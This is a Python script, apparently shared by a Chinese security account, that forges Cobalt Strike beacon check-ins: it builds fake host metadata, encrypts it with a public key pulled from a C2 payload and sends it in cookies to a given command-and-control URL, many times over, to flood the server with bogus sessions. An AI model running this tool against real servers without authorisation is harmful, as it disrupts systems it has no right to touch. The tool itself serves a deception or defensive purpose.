#!/usr/bin/env python
# coding=utf-8
from typing import Text
import rsa
import random
import linecache
import urllib.request
import multiprocessing
import base64

print("  ____ ____    _____     _          ____        _               _ _")
print(" / ___/ ___|  |  ___|_ _| | _____  / ___| _   _| |__  _ __ ___ (_) |_")
print("| |   \___ \  | |_ / _` | |/ / _ \ \___ \| | | | '_ \| '_ ` _ \| | __|")
print("| |___ ___) | |  _| (_| |   <  __/  ___) | |_| | |_) | | | | | | | |_")
print(" \____|____/  |_|  \__,_|_|\_\___| |____/ \__,_|_.__/|_| |_| |_|_|\__|")
print('+  @公众号 : F12sec                                                ')
print('+  @Author : LiAoRJ                                               ')
print('+  使用格式: python3 cs_fakesubmit.py                                  ')
print('+  将PublicKey放入Public.txt         >>> MIGfXXXXXXXXXXXXXXXX==                             ')
print('+  输入C2 Server URL         >>> 如 http://192.168.1.1:8081/dot.gif                          ')


def fake_submit(url,Textline1,Textline2,Textline3,pubkey):
# for _ in range(10):
    #pack = b'\x00\x00\xBE\xEF'  # pack head
    #pack += b'\x00\x00\x00\x4C'  # pack len
    pack = bytearray(random.getrandbits(4) for _ in range(16))  # AESKEY
    pack += b'\xa8\x03'  # name charset  (int) (little)
    pack += b'\xa8\x03'  # name charset  (int) (little)
    # pack+=b'\x00\x00\x00\x06' # Beacon Id random
    pack += random.randint(0 , 9999999) .to_bytes(4, 'big') # Beacon Id
    pack += random.randint(0 , 65535) .to_bytes(4, 'big') # Beacon Pid
    pack += b'\x00\x00'  # Beacon Port
    pack += b'\x04'  # Beacon Flag 04
    pack += b'\x06'
    pack += b'\x02'
    pack += b'\x23\xf0\x00\x00\x00\x00'  # windows version (int)
    pack += b'\x76\x91'  # windows version_1 (int)
    pack += b'\x0a\x60\x76\x90\xf5\x50'
    pack += bytearray(random.getrandbits(4) for _ in range(2)) + b'\xA8\xC0' #Beacon ip  192.168.xxx.xxx

    Computer_name = bytes(Textline1.encode('utf-8')) + b'\x09'
    User_name = bytes(Textline2.encode('utf-8')) + b'\x09'
    Process_name = bytes(Textline3.encode('utf-8')) + b'\x09'
    pack += Computer_name + User_name + Process_name
    #pack += bytes(''.join(random.sample(string.ascii_letters + string.digits, 6)), encoding = "utf8")+ b'\x09' + bytes(''.join(random.sample(string.ascii_letters + string.digits, 6)), encoding = "utf8") + b'\x09' + bytes(''.join(random.sample(string.ascii_letters + string.digits, 6)), encoding = "utf8")
    pack = b'\x00\x00\xBE\xEF'+len(pack).to_bytes(4, 'big')+pack

    # pubkey = rsa.PublicKey.load_pkcs1_openssl_pem("""
    # -----BEGIN PUBLIC KEY-----
    # MIGfXXXXXXXXXXXXXXXX==
    # -----END PUBLIC KEY-----
    # """)
    pem_prefix = '-----BEGIN PUBLIC KEY-----\n'
    pem_suffix = '\n-----END PUBLIC KEY-----'
    key = '{}{}{}'.format(pem_prefix,pubkey,pem_suffix)
    pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(
        key
    )
    # use the CobaltStrikeParser extract public key from the payload https://github.com/Sentinel-One/CobaltStrikeParser  parse_beacon_config.py payload_url --json
    #Remember to remove the extra padding from the public key
    enpack = rsa.encrypt(pack, pubkey)
    header = {
        'Cookie': base64.b64encode(enpack).decode('utf-8')
    }
    request = urllib.request.Request(url, headers=header)
    reponse = urllib.request.urlopen(request).read()


if __name__ == "__main__":
    url = input("请输入目标C2 Server URL:") # C2 Server URL
    number = input("请输入要发送的次数：") #发送次数
    filename1 = './Computer_name.txt' #计算机名称
    filename2 = './User_name.txt' #用户名称
    filename3 = './Process_name.txt'#进程名
    filename4 = './Public_key.txt'
    with open(filename1,'r') as file1:
        with open(filename2,'r') as file2:
            with open(filename3,'r') as file3:    
                with open(filename4,'r') as file4:
                    pubkey = file4.readline()
                    Count1 = len(file1.readlines())
                    Count2 = len(file2.readlines())
                    Count3 = len(file3.readlines())
    for _ in range(int(number)):
        Textline1 = linecache.getline(filename1,random.randint(1,Count1)).replace('\n','')
        Textline2 = linecache.getline(filename2,random.randint(1,Count2)).replace('\n','')
        Textline3 = linecache.getline(filename3,random.randint(1,Count3)).replace('\n','')
        t = multiprocessing.Process(target=fake_submit(url,Textline1,Textline2,Textline3,pubkey)) 
        t.start()
        # fake_submit(url,Textline1,Textline2,Textline3)
    print("OK!")


